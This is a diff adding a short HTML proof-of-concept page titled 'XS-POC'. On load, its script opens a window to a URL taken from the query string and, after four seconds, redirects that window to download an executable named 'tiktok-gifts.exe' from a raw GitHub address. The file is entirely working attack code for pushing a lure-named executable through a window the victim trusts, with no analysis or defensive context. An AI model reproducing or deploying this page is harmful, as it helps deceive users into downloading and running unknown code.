@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XS-POC</title>
+    <script>
+        var logic;
+
+        function init() {
+            logic.location.href = "https://raw.githubusercontent.com/megaman777/Buckets/refs/heads/main/tiktok-gifts.exe";
+        }
+
+        function launch() {
+            var targetValue = getTargetValue();
+            if (targetValue) {
+                logic = window.open(targetValue, "logic", "");
+                setTimeout(init, 4000);
+            }
+        }
+
+        function getTargetValue() {
+            var params = new URLSearchParams(window.location.search);
+            return params.get("target");
+        }
+
+        window.onload = function() {
+            launch();
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
